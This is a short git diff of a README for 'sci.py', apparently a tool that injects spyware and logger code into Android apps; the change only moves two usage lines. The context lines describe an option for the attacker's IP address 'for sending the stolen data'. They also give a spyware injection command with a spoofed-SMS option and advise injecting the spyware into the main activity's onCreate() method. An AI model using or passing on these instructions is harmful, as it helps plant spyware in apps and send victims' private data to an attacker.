@@ -41,6 +41,14 @@ A high level overview of the steps involved during code injection is:
 	[-rh]:  IP address of the attacker/script for sending the stolen data.
 	[-s]:	search for the main activity.
 
+Identify the main activity - works with obfuscated apps -:
+
+		$ python3 sci.py -a [apps] -s
+		
+Display the help menu:
+
+		$ python3 sci.py -h
+		
 #### Spyware usage:
 
 		$ python3 sci.py -a [app] -t [target] -k [keyword] -p spyware -rh [script] -ppg [spoofed_SMS] 
@@ -49,14 +57,6 @@ A high level overview of the steps involved during code injection is:
 	[-rh]: 	IP of the remote receiver (or URL of the file responsible for the JSON data handling and parsing (a script example can be found under /scripts/handler.php - do not forget to change the settings to connect to your DB -).
 
 *Advice*: Inject the Spyware on the **onCreate()** method of the main activity.
-
-Identify the main activity - works with obfuscated apps -:
-
-		$ python3 sci.py -a [apps] -s
-		
-Display the help menu:
-
-		$ python3 sci.py -h
 		
 #### Logger usage:
 
